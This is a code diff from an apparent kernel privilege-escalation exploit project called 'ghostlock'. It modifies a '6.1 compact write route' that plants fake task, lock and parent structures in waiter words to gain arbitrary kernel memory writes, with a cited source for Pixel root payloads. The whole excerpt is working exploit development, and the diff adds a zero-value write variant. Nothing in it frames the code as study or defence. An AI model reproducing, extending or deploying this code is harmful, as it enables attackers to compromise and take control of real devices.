@@ -304,16 +304,22 @@ namespace ghostlock::route {
         };
 
         if (compact) {
-            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
-         * the write value, children the write target; waiter->task is the
-         * payload fake_task (planted fields for the PI walk). */
+            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c).
+             * A zero value uses the no-child arm instead. */
+            const bool zero_value =
+                    request->mode == memory::WriteMode::Zero &&
+                    !request->preserve_child;
+            const uint64_t tree_pc = zero_value
+                    ? static_cast<uint64_t>(session::g_exploit_session.heap.current.fake_parent)
+                    : static_cast<uint64_t>(session::g_exploit_session.heap.current.fake_right);
+            const uint64_t tree_left = zero_value ? 0 : request->target;
             struct pselect_waiter_word words[] = {
-                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
+                {2, tree_pc, "tree_pc"},
                 {3, 0, "tree_right"},
-                {4, request->target, "tree_left"},
-                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
+                {4, tree_left, "tree_left"},
+                {5, tree_pc, "pi_pc"},
                 {6, 0, "pi_right"},
-                {7, request->target, "pi_left"},
+                {7, tree_left, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                 {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
